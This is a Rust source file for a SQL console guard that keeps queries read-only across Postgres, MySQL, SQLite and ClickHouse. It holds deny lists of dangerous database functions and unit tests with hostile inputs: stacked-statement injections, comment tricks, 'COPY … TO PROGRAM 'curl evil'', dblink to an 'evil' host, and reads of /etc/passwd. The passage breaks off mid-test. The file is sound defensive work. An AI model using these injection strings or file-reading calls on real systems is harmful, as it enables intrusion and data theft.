//! The SQL console's guard (ARCHITECTURE §12.3, read-only in depth). A query is parsed by `sqlparser` for its
//! database: one statement, which only reads (`SELECT`, `WITH … SELECT`, `VALUES`, `TABLE`, `EXPLAIN` of a query,
//! `SHOW`, `DESCRIBE`), nowhere a statement that writes (a `WITH` that deletes), no `SELECT … INTO`, no row locks,
//! none of the functions in [`REFUSED`]. The text the client gets is the one checked, cut of what surrounds it,
//! with a `LIMIT` added when the query has none; the client runs it in a read-only transaction with a timeout
//! ([`args`]), for a user TermF asks to be read-only when the connection is tested.

use std::fmt;
use std::ops::ControlFlow;

use serde::Serialize;
use sqlparser::ast::{
    Expr, LimitClause, ObjectName, ObjectNamePart, Query, Select, Statement, TableFactor, Visit,
    Visitor,
};
use sqlparser::dialect::{
    ClickHouseDialect, Dialect, MySqlDialect, PostgreSqlDialect, SQLiteDialect,
};
use sqlparser::parser::{Parser, ParserOptions};
use sqlparser::tokenizer::{Location, Token, Tokenizer};

use crate::Kind;

/// Functions that act beyond the result even in a read-only transaction: they end sessions, read or write the
/// server's files, reach another server, take locks, change settings, sleep, or run SQL held in a string.
pub const REFUSED: &[&str] = &[
    // Postgres
    "pg_terminate_backend",
    "pg_cancel_backend",
    "pg_reload_conf",
    "pg_rotate_logfile",
    "pg_rotate_logfile_old",
    "pg_switch_wal",
    "pg_switch_xlog",
    "pg_promote",
    "pg_start_backup",
    "pg_stop_backup",
    "pg_notify",
    "pg_stat_file",
    "pg_logdir_ls",
    "pg_import_system_collations",
    "pg_log_backend_memory_contexts",
    "pg_log_standby_snapshot",
    "pg_stat_statements_reset",
    "pg_current_xact_id",
    "txid_current",
    "set_config",
    "nextval",
    "setval",
    "lowrite",
    "loread",
    // MySQL
    "sleep",
    "benchmark",
    "get_lock",
    "release_lock",
    "release_all_locks",
    "load_file",
    "master_pos_wait",
    "source_pos_wait",
    "wait_for_executed_gtid_set",
    "wait_until_sql_thread_after_gtids",
    "sys_exec",
    "sys_eval",
    "sys_set",
];

/// Families refused by the start of their name: `dblink*`, large objects, advisory locks, server files, slots
/// and replication, statistics resets, sleeps, backups, and SQL run from a string.
pub const REFUSED_PREFIXES: &[&str] = &[
    "dblink",
    "lo_",
    "pg_advisory",
    "pg_try_advisory",
    "pg_stat_reset",
    "pg_ls_",
    "pg_read_",
    "pg_file_",
    "pg_replication_",
    "pg_create_",
    "pg_drop_",
    "pg_copy_",
    "pg_logical_",
    "pg_wal_replay",
    "pg_xlog_replay",
    "pg_sleep",
    "pg_backup_",
    "query_to_xml",
    "cursor_to_xml",
];

/// SQLite's shell functions that reach files, an editor or extensions (its safe mode refuses them too).
pub const SQLITE_REFUSED: &[&str] = &[
    "writefile",
    "readfile",
    "edit",
    "load_extension",
    "fsdir",
    "lsdir",
    "zipfile",
    "sqlar_compress",
    "sqlar_uncompress",
    "fts3_tokenizer",
];

/// ClickHouse's table functions that reach files, other servers or programs, and its sleeps.
pub const CLICKHOUSE_REFUSED: &[&str] = &[
    "file",
    "url",
    "urlcluster",
    "s3",
    "s3cluster",
    "gcs",
    "azureblobstorage",
    "hdfs",
    "remote",
    "remotesecure",
    "cluster",
    "clusterallreplicas",
    "mysql",
    "postgresql",
    "mongodb",
    "redis",
    "sqlite",
    "jdbc",
    "odbc",
    "executable",
    "input",
    "iceberg",
    "deltalake",
    "hudi",
    "sleep",
    "sleepeachrow",
];

/// The rows a query returns when its recipe says nothing.
pub const ROWS: usize = 500;

/// Why the SQL console refuses a query: what the app translates.
#[derive(Serialize, Clone, Copy, Debug, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub enum Why {
    /// Not a database connection.
    Database,
    Empty,
    Control,
    /// MySQL: a backslash.
    Backslash,
    /// MySQL: `/*! … */` or `/*M! … */`.
    Executable,
    /// `subject`: the parser's message.
    Unreadable,
    /// `subject`: how many statements.
    Several,
    /// `subject`: the statement's first word.
    NotRead,
    ExplainAnalyze,
    ExplainOnly,
    Into,
    Locks,
    /// `subject`: the function's name.
    Function,
}

/// A query refused, with what to name in the reason.
#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
pub struct Refused {
    pub code: Why,
    pub subject: String,
}

impl Refused {
    fn new(code: Why, subject: impl Into<String>) -> Self {
        Self {
            code,
            subject: subject.into(),
        }
    }
}

impl fmt::Display for Refused {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let s = &self.subject;
        match self.code {
            Why::Database => write!(
                f,
                "SQL runs on a Postgres, MySQL, MariaDB, SQLite or ClickHouse connection"
            ),
            Why::Empty => write!(f, "the query is empty"),
            Why::Control => write!(
                f,
                "a query holds no control character but line breaks and tabs"
            ),
            Why::Backslash => write!(
                f,
                "MySQL: no backslash in the query (its meaning depends on the server's sql_mode); write it CHAR(92)"
            ),
            Why::Executable => write!(
                f,
                "MySQL: no executable comment (/*! … */ or /*M! … */) in the SQL console"
            ),
            Why::Unreadable => write!(f, "not a query TermF can read: {s}"),
            Why::Several => write!(f, "one statement at a time: this holds {s}"),
            Why::NotRead => write!(
                f,
                "{s} is not a read: the SQL console runs one SELECT, WITH … SELECT, EXPLAIN, SHOW or DESCRIBE"
            ),
            Why::ExplainAnalyze => write!(
                f,
                "EXPLAIN ANALYZE runs the statement it explains ({s}): only a query is explained"
            ),
            Why::ExplainOnly => write!(f, "the SQL console explains only a query, not {s}"),
            Why::Into => write!(
                f,
                "SELECT … INTO writes a table, a file or variables: the SQL console only reads"
            ),
            Why::Locks => write!(
                f,
                "FOR UPDATE / FOR SHARE locks rows: the SQL console only reads"
            ),
            Why::Function => write!(
                f,
                "{s}() acts beyond reading: TermF refuses it in the SQL console"
            ),
        }
    }
}

impl std::error::Error for Refused {}

fn refused(name: &ObjectName, own: &[&str]) -> ControlFlow<Refused> {
    let last = match name.0.last() {
        Some(ObjectNamePart::Identifier(i)) => i.value.to_lowercase(),
        Some(ObjectNamePart::Function(f)) => f.name.value.to_lowercase(),
        None => return ControlFlow::Continue(()),
    };
    if REFUSED.contains(&last.as_str())
        || own.contains(&last.as_str())
        || REFUSED_PREFIXES.iter().any(|p| last.starts_with(p))
    {
        return ControlFlow::Break(Refused::new(Why::Function, last));
    }
    ControlFlow::Continue(())
}

/// The first word of a statement, to say what it is.
fn keyword(statement: &Statement) -> String {
    let text = statement.to_string();
    text.split_whitespace()
        .next()
        .unwrap_or("this")
        .to_uppercase()
}

/// Walks every statement, query, select, expression and table of the tree, nested ones included.
struct Guard {
    /// The database's own functions that act beyond reading.
    own: &'static [&'static str],
}

impl Visitor for Guard {
    type Break = Refused;

    fn pre_visit_statement(&mut self, statement: &Statement) -> ControlFlow<Refused> {
        use Statement as S;
        match statement {
            S::Query(_)
            | S::ExplainTable { .. }
            | S::ShowFunctions { .. }
            | S::ShowVariable { .. }
            | S::ShowStatus { .. }
            | S::ShowVariables { .. }
            | S::ShowCreate { .. }
            | S::ShowColumns { .. }
            | S::ShowCatalogs { .. }
            | S::ShowDatabases { .. }
            | S::ShowProcessList { .. }
            | S::ShowSchemas { .. }
            | S::ShowCharset(_)
            | S::ShowObjects(_)
            | S::ShowTables { .. }
            | S::ShowViews { .. }
            | S::ShowCollation { .. } => ControlFlow::Continue(()),
            S::Explain {
                statement,
                analyze,
                options,
                ..
            } => {
                if matches!(**statement, S::Query(_)) {
                    return ControlFlow::Continue(());
                }
                let analyzed = *analyze
                    || options.iter().flatten().any(|o| {
                        let name = o.name.value.to_lowercase();
                        name == "analyze" || name == "analyse"
                    });
                let code = if analyzed {
                    Why::ExplainAnalyze
                } else {
                    Why::ExplainOnly
                };
                ControlFlow::Break(Refused::new(code, keyword(statement)))
            }
            other => ControlFlow::Break(Refused::new(Why::NotRead, keyword(other))),
        }
    }

    fn pre_visit_query(&mut self, query: &Query) -> ControlFlow<Refused> {
        if !query.locks.is_empty() {
            return ControlFlow::Break(Refused::new(Why::Locks, ""));
        }
        ControlFlow::Continue(())
    }

    fn pre_visit_select(&mut self, select: &Select) -> ControlFlow<Refused> {
        if select.into.is_some() {
            return ControlFlow::Break(Refused::new(Why::Into, ""));
        }
        ControlFlow::Continue(())
    }

    fn pre_visit_expr(&mut self, expr: &Expr) -> ControlFlow<Refused> {
        match expr {
            Expr::Function(f) => refused(&f.name, self.own),
            _ => ControlFlow::Continue(()),
        }
    }

    fn pre_visit_table_factor(&mut self, table: &TableFactor) -> ControlFlow<Refused> {
        match table {
            TableFactor::Table {
                name,
                args: Some(_),
                ..
            }
            | TableFactor::Function { name, .. } => refused(name, self.own),
            _ => ControlFlow::Continue(()),
        }
    }
}

/// The byte where sqlparser's (1-based) line and column fall in `text`.
fn offset(text: &str, at: Location) -> usize {
    let (mut line, mut column) = (1, 1);
    for (i, c) in text.char_indices() {
        if line == at.line && column == at.column {
            return i;
        }
        if c == '\n' {
            line += 1;
            column = 1;
        } else {
            column += 1;
        }
    }
    text.len()
}

/// Whether a query says how many rows it returns.
fn limited(query: &Query) -> bool {
    query.fetch.is_some()
        || matches!(
            &query.limit_clause,
            Some(LimitClause::LimitOffset { limit: Some(_), .. })
                | Some(LimitClause::OffsetCommaLimit { .. })
        )
}

/// The query to run, or why the SQL console refuses it. `rows`: the `LIMIT` added to a query without one.
pub fn analyze(sql: &str, kind: Kind, rows: usize) -> Result<String, Refused> {
    if !kind.is_db() {
        return Err(Refused::new(Why::Database, ""));
    }
    let mysql = matches!(kind, Kind::Mysql | Kind::Mariadb);
    let own = match kind {
        Kind::Sqlite => SQLITE_REFUSED,
        Kind::Clickhouse => CLICKHOUSE_REFUSED,
        _ => &[],
    };
    let refuse = |code: Why| Err(Refused::new(code, ""));
    // The servers end a `--` comment at a lone \r too: one form of line end, the same for every reader.
    let sql = sql.replace("\r\n", "\n").replace('\r', "\n");
    if sql
        .chars()
        .any(|c| c.is_control() && c != '\n' && c != '\t')
    {
        return refuse(Why::Control);
    }
    // Whether a backslash escapes depends on MySQL's sql_mode (NO_BACKSLASH_ESCAPES), which TermF cannot know, and
    // on ClickHouse's own escapes: where a string ends would be a guess.
    if (mysql || kind == Kind::Clickhouse) && sql.contains('\\') {
        return refuse(Why::Backslash);
    }
    if mysql {
        // MySQL runs what /*! … */ holds, MariaDB what /*M! … */ holds.
        let lower = sql.to_lowercase();
        if lower.contains("/*!") || lower.contains("/*m!") {
            return refuse(Why::Executable);
        }
    }
    let dialect: &dyn Dialect = match kind {
        Kind::Mysql | Kind::Mariadb => &MySqlDialect {},
        Kind::Sqlite => &SQLiteDialect {},
        Kind::Clickhouse => &ClickHouseDialect {},
        _ => &PostgreSqlDialect {},
    };
    let unreadable = |e: &dyn fmt::Display| Refused::new(Why::Unreadable, e.to_string());
    let tokens = Tokenizer::new(dialect, &sql)
        .with_unescape(false)
        .tokenize_with_location()
        .map_err(|e| unreadable(&e))?;
    let significant: Vec<_> = tokens
        .iter()
        .filter(|t| !matches!(t.token, Token::Whitespace(_) | Token::SemiColon))
        .collect();
    let (Some(first), Some(last)) = (significant.first(), significant.last()) else {
        return refuse(Why::Empty);
    };
    let (start, end) = (offset(&sql, first.span.start), offset(&sql, last.span.end));
    let statements = Parser::new(dialect)
        .with_options(ParserOptions::new().with_unescape(false))
        .with_tokens_with_locations(tokens.clone())
        .parse_statements()
        .map_err(|e| unreadable(&e))?;
    if statements.len() != 1 {
        return Err(Refused::new(Why::Several, statements.len().to_string()));
    }
    if let ControlFlow::Break(e) = statements[0].visit(&mut Guard { own }) {
        return Err(e);
    }
    // Cut at its last token: a comment after it would swallow the LIMIT.
    let mut text = sql[start..end].to_owned();
    if let Statement::Query(query) = &statements[0]
        && !limited(query)
    {
        text.push_str(&format!(" LIMIT {rows}"));
    }
    Ok(text)
}

/// What the client gets for `sql`: a transaction that only reads, the statement's time limit on the server, then
/// the query; Postgres prints CSV, MySQL (`--batch`) tab-separated values.
pub fn args(kind: Kind, sql: &str, timeout_s: u64) -> Vec<String> {
    let ms = timeout_s * 1000;
    match kind {
        Kind::Postgres => vec![
            "--csv".into(),
            "-P".into(),
            "null=NULL".into(),
            "-c".into(),
            "START TRANSACTION READ ONLY".into(),
            "-c".into(),
            format!("SET LOCAL statement_timeout = {ms}"),
            "-c".into(),
            // Where a string ends must not depend on the server's settings.
            "SET LOCAL standard_conforming_strings = on".into(),
            "-c".into(),
            sql.into(),
        ],
        // Opened with `-readonly -safe`: no statement timeout of its own, TermF's stops it.
        Kind::Sqlite => ["-csv", "-header", "-nullvalue", "NULL", sql]
            .map(String::from)
            .to_vec(),
        // `--readonly=1` is in the connection's options; the time limit is the server's.
        Kind::Clickhouse => vec![
            format!("--max_execution_time={timeout_s}"),
            "--format=TSVWithNames".into(),
            "--format_tsv_null_representation=NULL".into(),
            "--query".into(),
            sql.into(),
        ],
        // MariaDB's limit is `max_statement_time`, in seconds (it refuses MySQL's variable).
        Kind::Mariadb => vec![
            "-e".into(),
            format!(
                "SET SESSION max_statement_time = {timeout_s};\nSTART TRANSACTION READ ONLY;\n{sql}"
            ),
        ],
        _ => vec![
            "-e".into(),
            format!("SET SESSION max_execution_time = {ms};\nSTART TRANSACTION READ ONLY;\n{sql}"),
        ],
    }
}

/// The query that reads a database's tables, columns, keys and indexes, in rows of
/// `kind (c|i), schema, table, name, type (an index: its columns or its definition), nullable (an index: UNIQUE), key, position`.
pub fn schema_query(kind: Kind) -> &'static str {
    match kind {
        Kind::Postgres => {
            "SELECT 'c', c.table_schema::text, c.table_name::text, c.column_name::text, c.data_type::text, \
             c.is_nullable::text, COALESCE((SELECT string_agg(DISTINCT tc.constraint_type::text, ',') \
             FROM information_schema.key_column_usage k JOIN information_schema.table_constraints tc \
             ON tc.constraint_name = k.constraint_name AND tc.table_schema = k.table_schema \
             WHERE k.table_schema = c.table_schema AND k.table_name = c.table_name AND k.column_name = c.column_name), ''), \
             c.ordinal_position::int FROM information_schema.columns c \
             WHERE c.table_schema NOT IN ('pg_catalog', 'information_schema') \
             UNION ALL SELECT 'i', schemaname::text, tablename::text, indexname::text, indexdef, \
             CASE WHEN indexdef LIKE 'CREATE UNIQUE%' THEN 'UNIQUE' ELSE '' END, '', 0 FROM pg_indexes \
             WHERE schemaname NOT IN ('pg_catalog', 'information_schema')"
        }
        Kind::Mysql | Kind::Mariadb => {
            "SELECT 'c', c.TABLE_SCHEMA, c.TABLE_NAME, c.COLUMN_NAME, c.COLUMN_TYPE, c.IS_NULLABLE, c.COLUMN_KEY, \
             c.ORDINAL_POSITION FROM information_schema.COLUMNS c WHERE c.TABLE_SCHEMA = DATABASE() \
             UNION ALL SELECT 'i', s.TABLE_SCHEMA, s.TABLE_NAME, s.INDEX_NAME, \
             GROUP_CONCAT(s.COLUMN_NAME ORDER BY s.SEQ_IN_INDEX SEPARATOR ', '), \
             IF(MIN(s.NON_UNIQUE) = 0, 'UNIQUE', ''), '', 0 FROM information_schema.STATISTICS s \
             WHERE s.TABLE_SCHEMA = DATABASE() GROUP BY s.TABLE_SCHEMA, s.TABLE_NAME, s.INDEX_NAME"
        }
        Kind::Sqlite => {
            "SELECT 'c', 'main', m.name, p.name, p.type, CASE WHEN p.\"notnull\" = 0 THEN 'YES' ELSE 'NO' END, \
             CASE WHEN p.pk > 0 THEN 'PRI' ELSE '' END, p.cid FROM sqlite_master m JOIN pragma_table_info(m.name) p \
             WHERE m.type IN ('table', 'view') AND m.name NOT LIKE 'sqlite_%' \
             UNION ALL SELECT 'i', 'main', m.name, il.name, \
             (SELECT group_concat(ii.name, ', ') FROM pragma_index_info(il.name) ii), \
             CASE WHEN il.\"unique\" THEN 'UNIQUE' ELSE '' END, '', 0 \
             FROM sqlite_master m JOIN pragma_index_list(m.name) il \
             WHERE m.type = 'table' AND m.name NOT LIKE 'sqlite_%'"
        }
        _ => {
            "SELECT 'c', \"database\", \"table\", name, type, if(startsWith(type, 'Nullable'), 'YES', 'NO'), \
             if(is_in_primary_key = 1, 'PRI', if(is_in_sorting_key = 1, 'MUL', '')), toUInt64(position) \
             FROM system.columns WHERE \"database\" = currentDatabase() \
             UNION ALL SELECT 'i', \"database\", \"table\", name, expr, type, '', toUInt64(0) \
             FROM system.data_skipping_indices WHERE \"database\" = currentDatabase()"
        }
    }
}

#[derive(serde::Serialize, Clone, Debug, Default, PartialEq)]
pub struct Column {
    pub name: String,
    #[serde(rename = "type")]
    pub kind: String,
    pub nullable: bool,
    /// `pk` (in the primary key), `fk`, `unique`, `index`, or empty.
    pub key: String,
}

#[derive(serde::Serialize, Clone, Debug, Default, PartialEq)]
pub struct Index {
    pub name: String,
    /// Its columns, or its definition.
    pub columns: String,
    pub unique: bool,
}

#[derive(serde::Serialize, Clone, Debug, Default, PartialEq)]
pub struct SchemaTable {
    /// Empty in the connection's default schema (`public`, the database itself, `main`).
    pub schema: String,
    pub name: String,
    pub columns: Vec<Column>,
    pub indexes: Vec<Index>,
}

/// The tables of a [`schema_query`]'s result, by schema and name, each one's columns in their order.
pub fn schema(kind: Kind, table: &Table) -> Vec<SchemaTable> {
    let mut tables: Vec<SchemaTable> = Vec::new();
    let mut positions: Vec<Vec<i64>> = Vec::new();
    for row in &table.rows {
        let [what, schema, name, item, typed, nullable, key, position] = row.as_slice() else {
            continue;
        };
        // Postgres' `public` is where an unqualified name looks; MySQL and ClickHouse name the database itself.
        let schema = match kind {
            Kind::Postgres if schema == "public" => String::new(),
            Kind::Postgres => schema.clone(),
            _ => String::new(),
        };
        let at = match tables
            .iter()
            .position(|t| t.schema == schema && &t.name == name)
        {
            Some(at) => at,
            None => {
                tables.push(SchemaTable {
                    schema,
                    name: name.clone(),
                    ..SchemaTable::default()
                });
                positions.push(Vec::new());
                tables.len() - 1
            }
        };
        if what == "i" {
            tables[at].indexes.push(Index {
                name: item.clone(),
                columns: typed.clone(),
                unique: nullable == "UNIQUE",
            });
            continue;
        }
        let key = match key.as_str() {
            k if k.contains("PRI") || k.contains("PRIMARY") => "pk",
            k if k.contains("FOREIGN") => "fk",
            k if k.contains("UNI") => "unique",
            "MUL" => "index",
            _ => "",
        };
        let position: i64 = position.parse().unwrap_or(0);
        let i = positions[at].partition_point(|p| *p <= position);
        positions[at].insert(i, position);
        tables[at].columns.insert(
            i,
            Column {
                name: item.clone(),
                kind: typed.clone(),
                nullable: nullable == "YES",
                key: key.into(),
            },
        );
    }
    tables.sort_by(|a, b| (&a.schema, &a.name).cmp(&(&b.schema, &b.name)));
    tables
}

/// A query's result: the names of its columns, then its rows.
#[derive(serde::Serialize, Clone, Debug, Default, PartialEq)]
pub struct Table {
    pub columns: Vec<String>,
    pub rows: Vec<Vec<String>>,
}

/// psql's `--csv`: fields between commas, in double quotes when they hold a comma, a quote or a line break. Only
/// records that end: a last one without its line break was cut by the output's limit, and is dropped (`true`).
fn csv(text: &str) -> (Vec<Vec<String>>, bool) {
    let (mut records, mut record, mut field) = (Vec::new(), Vec::new(), String::new());
    let (mut quoted, mut chars) = (false, text.chars().peekable());
    while let Some(c) = chars.next() {
        match (quoted, c) {
            (true, '"') if chars.peek() == Some(&'"') => {
                chars.next();
                field.push('"');
            }
            (true, '"') => quoted = false,
            (true, c) => field.push(c),
            (false, '"') => quoted = true,
            (false, ',') => record.push(std::mem::take(&mut field)),
            (false, '\n') => {
                record.push(std::mem::take(&mut field));
                records.push(std::mem::take(&mut record));
            }
            (false, '\r') => {}
            (false, c) => field.push(c),
        }
    }
    (records, quoted || !field.is_empty() || !record.is_empty())
}

/// mysql's `--batch`: tab-separated, `\t`, `\n`, `\\` and `\0` escaped; a last line without its line break is
/// dropped (`true`), as in [`csv`].
fn tsv(text: &str) -> (Vec<Vec<String>>, bool) {
    let mut lines: Vec<&str> = text.split('\n').collect();
    let partial = lines.pop().is_some_and(|last| !last.is_empty());
    let records = lines
        .into_iter()
        .map(|line| {
            line.split('\t')
                .map(|field| {
                    let mut out = String::new();
                    let mut chars = field.chars();
                    while let Some(c) = chars.next() {
                        if c != '\\' {
                            out.push(c);
                            continue;
                        }
                        match chars.next() {
                            Some('t') => out.push('\t'),
                            Some('n') => out.push('\n'),
                            Some('r') => out.push('\r'),
                            Some('0') => out.push('\0'),
                            Some(other) => out.push(other),
                            None => out.push('\\'),
                        }
                    }
                    out
                })
                .collect()
        })
        .collect();
    (records, partial)
}

/// The client's output as a table, the first record naming the columns; `true` when a cut record was dropped.
pub fn table(kind: Kind, text: &str) -> (Table, bool) {
    let (mut records, cut) = if matches!(kind, Kind::Mysql | Kind::Mariadb | Kind::Clickhouse) {
        tsv(text)
    } else {
        csv(text)
    };
    if records.is_empty() {
        return (Table::default(), cut);
    }
    let columns = records.remove(0);
    let table = Table {
        columns,
        rows: records,
    };
    (table, cut)
}

/// The table as text for an agent or the terminal: tab-separated, a line per row.
pub fn render(table: &Table) -> String {
    let cell = |c: &String| {
        c.replace('\\', "\\\\")
            .replace('\t', "\\t")
            .replace('\n', "\\n")
    };
    std::iter::once(&table.columns)
        .chain(&table.rows)
        .map(|r| r.iter().map(cell).collect::<Vec<_>>().join("\t") + "\n")
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn pg(sql: &str) -> Result<String, Refused> {
        analyze(sql, Kind::Postgres, 500)
    }

    fn my(sql: &str) -> Result<String, Refused> {
        analyze(sql, Kind::Mysql, 500)
    }

    #[test]
    fn reads_pass_with_a_limit_added_when_they_have_none() {
        for (sql, expected) in [
            (
                "SELECT id, email FROM users",
                "SELECT id, email FROM users LIMIT 500",
            ),
            (
                "select * from users where id = 1;",
                "select * from users where id = 1 LIMIT 500",
            ),
            ("  SELECT 1  ;  ;", "SELECT 1 LIMIT 500"),
            (
                "SELECT * FROM t ORDER BY id LIMIT 10",
                "SELECT * FROM t ORDER BY id LIMIT 10",
            ),
            (
                "SELECT * FROM t FETCH FIRST 3 ROWS ONLY",
                "SELECT * FROM t FETCH FIRST 3 ROWS ONLY",
            ),
            (
                "SELECT * FROM t OFFSET 5",
                "SELECT * FROM t OFFSET 5 LIMIT 500",
            ),
            (
                "WITH recent AS (SELECT * FROM orders WHERE at > now() - interval '1 day') SELECT count(*) FROM recent",
                "WITH recent AS (SELECT * FROM orders WHERE at > now() - interval '1 day') SELECT count(*) FROM recent LIMIT 500",
            ),
            (
                "SELECT a FROM x UNION SELECT b FROM y",
                "SELECT a FROM x UNION SELECT b FROM y LIMIT 500",
            ),
            ("VALUES (1), (2)", "VALUES (1), (2) LIMIT 500"),
            (
                "-- the last orders\nSELECT * FROM orders",
                "SELECT * FROM orders LIMIT 500",
            ),
            (
                "SELECT 1 /* a ; b */ FROM t -- end",
                "SELECT 1 /* a ; b */ FROM t LIMIT 500",
            ),
            (
                "SELECT 'it''s; DELETE FROM t' AS s",
                "SELECT 'it''s; DELETE FROM t' AS s LIMIT 500",
            ),
            (
                "SELECT $$ ; DROP TABLE t $$",
                "SELECT $$ ; DROP TABLE t $$ LIMIT 500",
            ),
            ("EXPLAIN SELECT * FROM users", "EXPLAIN SELECT * FROM users"),
            (
                "EXPLAIN ANALYZE SELECT * FROM users",
                "EXPLAIN ANALYZE SELECT * FROM users",
            ),
            (
                "explain (analyze, buffers) select 1",
                "explain (analyze, buffers) select 1",
            ),
            ("SHOW search_path", "SHOW search_path"),
            // Postgres nests comments: all of it after SELECT 1 is one comment, for the server as for TermF.
            (
                "SELECT 1 /* /* */ ; DELETE FROM users; */",
                "SELECT 1 LIMIT 500",
            ),
            (
                "SELECT u.id FROM users u WHERE u.id IN (SELECT user_id FROM orders)",
                "SELECT u.id FROM users u WHERE u.id IN (SELECT user_id FROM orders) LIMIT 500",
            ),
        ] {
            assert_eq!(
                pg(sql).unwrap_or_else(|e| panic!("{sql}: {e}")),
                expected,
                "{sql}"
            );
        }
        for (sql, expected) in [
            ("SELECT * FROM users", "SELECT * FROM users LIMIT 500"),
            (
                "SELECT * FROM users LIMIT 5, 10",
                "SELECT * FROM users LIMIT 5, 10",
            ),
            ("SHOW TABLES", "SHOW TABLES"),
            ("DESCRIBE users", "DESCRIBE users"),
            (
                "SELECT `order` FROM `orders` # last",
                "SELECT `order` FROM `orders` LIMIT 500",
            ),
            ("SELECT \"a;b\" FROM t", "SELECT \"a;b\" FROM t LIMIT 500"),
        ] {
            assert_eq!(
                my(sql).unwrap_or_else(|e| panic!("{sql}: {e}")),
                expected,
                "{sql}"
            );
        }
    }

    #[test]
    fn writes_and_traps_are_refused_with_the_reason() {
        for (sql, why) in [
            ("", "empty"),
            ("-- nothing\n;", "empty"),
            ("DELETE FROM users", "DELETE is not a read"),
            ("delete from users where id = 1", "DELETE is not a read"),
            ("UPDATE users SET admin = true", "UPDATE is not a read"),
            ("INSERT INTO users VALUES (1)", "INSERT is not a read"),
            ("DROP TABLE users", "DROP is not a read"),
            ("TRUNCATE users", "TRUNCATE is not a read"),
            ("COPY users TO '/tmp/u.csv'", "COPY is not a read"),
            ("COPY users TO PROGRAM 'curl evil'", "COPY"),
            ("CALL cleanup()", "CALL is not a read"),
            ("DO $$ BEGIN DELETE FROM users; END $$", "not a query"),
            ("GRANT ALL ON users TO alex", "GRANT is not a read"),
            (
                "SET default_transaction_read_only = off",
                "SET is not a read",
            ),
            ("BEGIN", "is not a read"),
            ("COMMIT", "COMMIT is not a read"),
            ("SELECT 1; DELETE FROM users", "one statement at a time"),
            ("SELECT 1;DELETE FROM users;", "one statement at a time"),
            (
                "SELECT 'x'; DROP TABLE users; --'",
                "one statement at a time",
            ),
            (
                "SELECT 1 /* */ ; DELETE FROM users",
                "one statement at a time",
            ),
            (
                "SELECT E'\\\\'; DELETE FROM users; --'",
                "one statement at a time",
            ),
            (
                "SELECT 1 -- x\r; DELETE FROM users",
                "one statement at a time",
            ),
            (
                "WITH gone AS (DELETE FROM users RETURNING *) SELECT * FROM gone",
                "DELETE is not a read",
            ),
            (
                "with moved as (update users set x = 1 returning id) select * from moved",
                "UPDATE is not a read",
            ),
            (
                "WITH a AS (INSERT INTO log VALUES (1) RETURNING id) SELECT * FROM a",
                "INSERT is not a read",
            ),
            ("EXPLAIN ANALYZE DELETE FROM users", "EXPLAIN ANALYZE runs"),
            ("explain analyze delete from users", "EXPLAIN ANALYZE runs"),
            (
                "EXPLAIN (ANALYZE) DELETE FROM users",
                "EXPLAIN ANALYZE runs",
            ),
            (
                "EXPLAIN (ANALYSE true) UPDATE users SET x = 1",
                "EXPLAIN ANALYZE runs",
            ),
            ("EXPLAIN DELETE FROM users", "explains only a query"),
            ("SELECT * INTO backup FROM users", "INTO"),
            ("select * into temp t from users", "INTO"),
            ("SELECT * FROM users FOR UPDATE", "FOR UPDATE"),
            ("SELECT * FROM users FOR SHARE", "FOR UPDATE"),
            (
                "SELECT * FROM (SELECT * FROM users FOR UPDATE) x",
                "FOR UPDATE",
            ),
            ("SELECT pg_terminate_backend(42)", "pg_terminate_backend()"),
            (
                "select PG_TERMINATE_BACKEND(pid) from pg_stat_activity",
                "pg_terminate_backend()",
            ),
            (
                "SELECT pg_catalog.pg_read_file('/etc/passwd')",
                "pg_read_file()",
            ),
            ("SELECT * FROM pg_ls_dir('/')", "pg_ls_dir()"),
            ("SELECT lo_import('/etc/passwd')", "lo_import()"),
            (
                "SELECT * FROM dblink('host=evil', 'DELETE FROM users') AS t(x int)",
                "dblink()",
            ),
            ("SELECT dblink_exec('DELETE FROM users')", "dblink_exec()"),
            (
                "SELECT set_config('statement_timeout', '0', false)",
                "set_config()",
            ),
            (
                "SELECT query_to_xml('DELETE FROM users', true, true, '')",
                "query_to_xml()",
            ),
            ("SELECT pg_sleep(60)", "pg_sleep()"),
            (
                "SELECT count(*) FROM users WHERE pg_advisory_lock(1) IS NOT NULL",
                "pg_advisory_lock()",
            ),
            ("SELECT \"pg_read_file\"('/etc/passwd')", "pg_read_file()"),
            (
                "SELECT (SELECT pg_cancel_backend(1))",
                "pg_cancel_backend()",
            ),
            ("SELECT nextval('ids')", "nextval()"),
            ("SELECT 1\u{0}", "control character"),
        ] {
            let e = pg(sql).expect_err(sql).to_string();
            assert!(e.contains(why), "{sql:?}: {e}");
        }
        for (sql, why) in [
            ("SELECT SLEEP(10)", "sleep()"),
            ("SELECT LOAD_FILE('/etc/passwd')", "load_file()"),
            ("SELECT GET_LOCK('x', 10)", "get_lock()"),
            ("SELECT * FROM users INTO OUTFILE '/tmp/u'", "not a query"),
            ("SELECT id INTO @x FROM users", "INTO"),
            ("SELECT * FROM users FOR UPDATE", "FOR UPDATE"),
            ("SELECT * FROM users LOCK IN SHARE MODE", "not a query"),
            ("SELECT 'a\\'; DELETE FROM users; -- '", "no backslash"),
            ("SELECT 1 /*! ; DELETE FROM users */", "executable comment"),
            ("SELECT 1 /*M! ; DELETE FROM users */", "executable comment"),
            (
                "SELECT 1 /* /* */ ; DELETE FROM users; -- */",
                "one statement at a time",
            ),
            (
                "SELECT 1 # x\n; DELETE FROM users",
                "one statement at a time",
            ),
            (
                "SELECT 1 -- x\r; DELETE FROM users",
                "one statement at a time",
            ),
            ("DELETE FROM users", "DELETE is not a read"),
            ("LOAD DATA INFILE '/tmp/x' INTO TABLE users", "not a query"),
            ("SET SESSION TRANSACTION READ WRITE", "SET is not a read"),
            ("KILL 42", "KILL is not a read"),
            ("HANDLER users OPEN", "not a query"),
        ] {
            let e = my(sql).expect_err(sql).to_string();
            assert!(e.contains(why), "{sql:?}: {e}");
        }
        assert_eq!(
            analyze("SELECT 1", Kind::Ssh, 500).unwrap_err().code,
            Why::Database
        );
    }

    #[test]
    fn a_refusal_carries_its_code_and_what_it_names() {
        for (sql, code, subject) in [
            ("", Why::Empty, ""),
            ("SELECT 1; SELECT 2", Why::Several, "2"),
            ("delete from users", Why::NotRead, "DELETE"),
            (
                "WITH g AS (UPDATE t SET x = 1 RETURNING *) SELECT * FROM g",
                Why::NotRead,
                "UPDATE",
            ),
            (
                "EXPLAIN ANALYZE DELETE FROM t",
